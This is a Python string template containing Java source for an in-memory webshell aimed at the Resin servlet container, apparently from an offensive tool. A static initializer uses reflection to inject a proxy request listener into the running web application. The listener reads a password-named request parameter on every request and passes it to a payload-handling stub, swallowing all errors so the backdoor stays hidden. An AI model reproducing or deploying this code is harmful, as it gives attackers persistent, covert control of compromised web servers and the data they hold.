code = """
import java.lang.reflect.*;
import java.util.*;

public class ResinListener implements InvocationHandler {{
    private static String password = "{password}";
{common}
{context}
{decoder}
{stub}
    private void hook(Object servletRequestEvent) throws Exception {{
        Object servletRequest = invokeMethod(
            servletRequestEvent, "getServletRequest"
        );
        Object servletResponse = invokeMethod(servletRequest, "getResponse");
        String payload = (String) invokeMethod(
            servletRequest, "getParameter", password
        );
        stub(payload, servletRequest, servletResponse);
    }}

    @Override
    public Object invoke(Object proxy, Method method, Object[] args)
            throws Throwable {{
        if (method.getName().equals("requestInitialized")) {{
            Object servletRequestEvent = args[0];
            hook(servletRequestEvent);
        }}
        return null;
    }}

    private void addListener(Object proxyObject) throws Exception {{
        Object webApp = getWebApp();
        ArrayList<?> listeners =
            (ArrayList<?>) getFieldValue(webApp, "_requestListeners");
        for (Object listener: listeners) {{
            if (listener instanceof Proxy) {{
                return;
            }}
        }}
        Class WebApp = webApp.getClass();
        if (WebApp.getName() == "com.caucho.server.webapp.Application") {{
            WebApp = WebApp.getSuperclass();
        }}
        Method addListenerObject = getMethodX(
            WebApp, "addListenerObject", 2
        );
        addListenerObject.setAccessible(true);
        addListenerObject.invoke(webApp, proxyObject, true);
    }}

    public ResinListener() {{
        synchronized(lock) {{
            Class servletRequestListener = null;
            try {{
                servletRequestListener = Class.forName(
                    "javax.servlet.ServletRequestListener"
                );
            }} catch (ClassNotFoundException e) {{}}

            if (servletRequestListener != null) {{
                Object proxyObject = Proxy.newProxyInstance(
                    getLoader(), new Class[]{{servletRequestListener}}, this
                );
                try {{
                    addListener(proxyObject);
                }} catch (Exception e) {{}}
            }}
        }}
    }}

    static {{
        new ResinListener();
    }}
}}
"""